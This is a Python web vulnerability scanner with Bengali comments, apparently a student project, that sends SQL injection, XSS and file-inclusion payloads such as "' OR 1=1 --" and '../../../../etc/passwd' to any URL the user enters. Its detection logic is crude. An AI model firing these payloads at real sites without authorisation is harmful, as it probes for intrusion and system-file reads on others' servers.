import requests
import re
from urllib.parse import urljoin

# স্ক্যানিং ফাংশন
def scan_page(url):
    try:
        # URL এর শেষের "/" ঠিকভাবে যোগ করা
        if not url.endswith('/'):
            url = url + '/'

        # ওয়েবপেজ এর কোড বের করা
        response = requests.get(url, timeout=10)
        page_content = response.text

        print(f"[*] Scanning page: {url}")

        # SQL Injection পরীক্ষা
        print("[*] Testing for SQL Injection...")
        sqli_payloads = ["' OR '1'='1", '" OR "1"="1', "' OR 1=1 --"]
        for payload in sqli_payloads:
            test_url = url + payload
            test_response = requests.get(test_url, timeout=10)
            if "error" in test_response.text.lower():
                print(f"[+] SQL Injection vulnerability found at: {test_url}")

        # XSS পরীক্ষা
        print("[*] Testing for XSS...")
        xss_payloads = ['<script>alert("xss")</script>', '<img src=x onerror=alert("xss")>']
        for payload in xss_payloads:
            test_url = url + payload
            test_response = requests.get(test_url, timeout=10)
            if payload in test_response.text:
                print(f"[+] XSS vulnerability found at: {test_url}")

        # LFI পরীক্ষা
        print("[*] Testing for LFI...")
        lfi_payloads = ['../../../../etc/passwd', '/proc/self/environ']
        for payload in lfi_payloads:
            test_url = url + payload
            test_response = requests.get(test_url, timeout=10)
            if "root:" in test_response.text:
                print(f"[+] LFI vulnerability found at: {test_url}")

    except Exception as e:
        print(f"[-] Error occurred: {e}")

# ইউজারের ইনপুট থেকে ওয়েবসাইট URL নিন
def get_target_url():
    url = input("Enter target website URL (with http/https): ").strip()
    return url

# স্ক্যান আবার করতে চাওয়ার অপশন
def scan_again():
    while True:
        choice = input("[+] Scan again? [y/n]: ").lower()
        if choice == 'y':
            url = get_target_url()
            scan_page(url)
        elif choice == 'n':
            print("[*] Exiting the scanner.")
            break
        else:
            print("[-] Invalid choice. Please enter 'y' or 'n'.")

def main():
    print("Welcome to NetWizards Scanner - Created by CSEB team")
    url = get_target_url()
    scan_page(url)
    scan_again()

if __name__ == "__main__":
    main()